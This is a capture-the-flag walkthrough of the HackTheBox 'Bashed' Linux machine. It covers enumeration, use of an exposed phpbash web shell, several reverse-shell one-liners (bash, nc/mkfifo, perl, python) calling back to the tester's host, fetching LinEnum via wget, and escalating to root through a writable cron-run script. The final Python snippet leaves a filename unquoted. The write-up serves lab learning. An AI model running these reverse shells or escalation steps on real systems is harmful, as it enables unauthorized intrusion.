# Bashed

## OS: Linux

## IP: 10.10.10.68

### Enumeration

Let's kick this off with a standard `nmap` scan.

```bash
$ nmap -sCV -vvv -oN bashed-nmap 10.10.10.68
# Nmap 7.80 scan initiated Thu Apr  2 06:16:17 2020 as: nmap -sCV -vvv -oA bashed-nmap 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up, received syn-ack (0.046s latency).
Scanned at 2020-04-02 06:16:17 CDT for 9s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  2 06:16:26 2020 -- 1 IP address (1 host up) scanned in 8.61 seconds
```

So the only thing we see is a webserver on port 80 running `Apache httpd 2.4.18`, and we know it's an `Ubuntu` server.

Let's open a browser and navigate to `http://10.10.10.68` and see what's there. We see a site with some references to developing a version of bash written in php. Nothing immediately obvious as to what to do. Let's take a look at the source code. Nothing there either.

Time for a directory search.

```bash
$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root.log --wildcard -t 40                                                             
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/02 06:22:58 Starting gobuster
===============================================================
/uploads (Status: 301)
/images (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/02 06:28:11 Finished
===============================================================
```

Some of these look pretty interesting. Checked `/uploads` and got a blank page, but opening `/dev` in a browser shows me a directory with two files listed: 

- `phpbash.min.php`
- `phpbash.php`

Clicking on `phpbash.php` opens up a shell on the webpage. It's safe to assume this shell was left over from the "development of phpbash" mentioned on the homepage of the website.

### Exploitation

Let's see if we can grab the `user.txt` proof.

```bash
www-data@bashed:/home/arrexel# cd /home/

www-data@bashed:/home# ls
arrexel
scriptmanager
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed
:/home/arrexel# wc user.txt
1 1 33 user.txt
```

Great, now let's get a real shell. I'll start a `nc` listener on port 4321 on my local machine with:

```bash
$ nc -lvnp 4321
```

And run the following line on the `phpbash` shell on the website to try to get a reverse shell:

```bash
$ bash -i >&/dev/tcp/10.10.14.31/4321 0>&1
```

Aaaaand.... nothing. Let's try something else.

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.31 4321 >/tmp/f
```

Also nothing. Maybe this one?

```bash
 $ perl -e 'use Socket;$i="10.10.14.31";$p=4321;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Also nothing. Python? 

```bash
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And that's a shell, ladies and gentlemen!

```bash
 $ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.68] 43200
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Upgrading Shell

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
# Background webshell with Ctrl-Z
# Now, in local shell run:
$ stty -a
$ echo $SHELL $TERM
$ stty raw -echo; fg
# Now, we're back in the webshell and need to set the $TERM and $SHELL variables, as well as the stty info
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows WHATEVER_WAS_IN_stty_-a columns WHATEVER_WAS_IN_stty_-a
$ clear
```

And now we have a full shell. Let's do some privilege escalation.

### Privilege Escalation

Let's get our favorite `LinEnum.sh` on this machine. I start a webserver from a directory that contains this script on my machine and will try to `curl` or `wget` it on the remote machine.

I have these two functions that I use to spin up a webserver on my machine quickly for HackTheBox:

```bash
htb_server () {
        echo "Server IP Address copied to clipboard" && echo "$(htb_ip):8000/" | xsel -ib && python3 -m http.server
}

htb_ip () {
        ifconfig tun0 | awk '/inet / {print $2}'
}
```

```bash
$ htb_server
Server IP Address copied to clipboard
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And then I run the following command from the shell on the remote machine:

```bash
www-data@bashed:/var/www/html/dev$ curl 10.10.14.31:8000/LinEnum.sh -o LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh 
The program 'curl' is currently not installed. To run 'curl' please ask your administrator to install the package 'curl'
```

Okay. Seems like `curl` isn't on the machine. Let's try `wget`.

```bash
www-data@bashed:/var/www/html/dev$ which wget
/usr/bin/wget
www-data@bashed:/var/www/html/dev$ wget 10.10.14.31:8000/LinEnum.sh
--2020-04-02 05:30:03--  http://10.10.14.31:8000/LinEnum.sh
Connecting to 10.10.14.31:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
LinEnum.sh: Permission denied

Cannot write to 'LinEnum.sh' (Success).
```

So, we successfully connected to my webserver to download the script, downloaded it and failed to write it to disk. To fix this, let's just write it to memory (`/dev/shm`)

```bash
www-data@bashed:/var/www/html/dev$ cd /dev/shm
www-data@bashed:/dev/shm$ wget 10.10.14.31:8000/LinEnum.sh
www-data@bashed:/dev/shm$ chmod +x LinEnum.sh && ./LinEnum.sh
```

> The full output of the script is available in `enumeration/LinEnum.output.txt`. Use `$ cat enumeration/LinEnum.output.txt` to see the script formatted properly.

Right off the bat, I see that it's running an old kernel (`Linux bashed 4.4.0-62-generic`). There are a variety of kernel exploits that we could use to get an insta-root, but I bet there's something more interesting I could do.

If we scroll down a bit further, we see this:

```
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This means that we can upgrade to a shell as scriptmanager with the following command: `$ sudo -u scriptmanager /bin/bash`.

```bash
scriptmanager@bashed:/dev/shm/$ cd /
scriptmanager@bashed:/$ ll
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ./
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ../
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin/
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot/
drwxr-xr-x  19 root          root           4240 Apr  2 04:14 dev/
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc/
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home/
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib/
drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64/
drwx------   2 root          root          16384 Dec  4  2017 lost+found/
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media/
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt/
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt/
dr-xr-xr-x 116 root          root              0 Apr  2 04:14 proc/
drwx------   3 root          root           4096 Dec  4  2017 root/
drwxr-xr-x  18 root          root            500 Apr  2 04:14 run/
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin/
drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts/
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv/
dr-xr-xr-x  13 root          root              0 Apr  2 04:14 sys/
drwxrwxrwt  10 root          root           4096 Apr  2 05:48 tmp/
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr/
drwxr-xr-x  12 root          root           4096 Dec  4  2017 var/
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Now we see that we can access the `scripts` directory (which we could not with the `www-data` user.) Let's take a peek.

```bash
scriptmanager@bashed:/$ cd scripts/
scriptmanager@bashed:/scripts$ ls
test.py  test.txt
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
testing 123!
```

It seems like `test.py` is run, maybe by a cronjob or something. It currently just opens `test.txt` and writes a string to the file.

```bash
ll
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 ./
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ../
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Apr  2 05:56 test.txt
```

If we take a closer look at the permissions, we can see that `test.txt` is owned by `root`. This likely means that the `root` user is running `test.py`. Let's edit this file to see if we can just read the flag that way.

```bash
scriptmanager@bashed:/scripts$ vim test.py
The program 'vim' can be found in the following packages:
 * vim
 * vim-gnome
 * vim-tiny
 * vim-athena
 * vim-athena-py2
 * vim-gnome-py2
 * vim-gtk
 * vim-gtk-py2
 * vim-gtk3
 * vim-gtk3-py2
 * vim-nox
 * vim-nox-py2
Ask your administrator to install one of them
scriptmanager@bashed:/scripts$ which nano
/bin/nano
```

No `vim`? How uncultured. Anyways, open `nano` and change the file to be:

```python
with open("/root/root.txt", "r") as f:
        content = f.read()
with open(test.txt, "w+") as f2:
        f2.write(content)
```

And a minute later, we have our root proof.

```bash
scriptmanager@bashed:/scripts$ wc test.txt
 1  1 33 test.txt
```
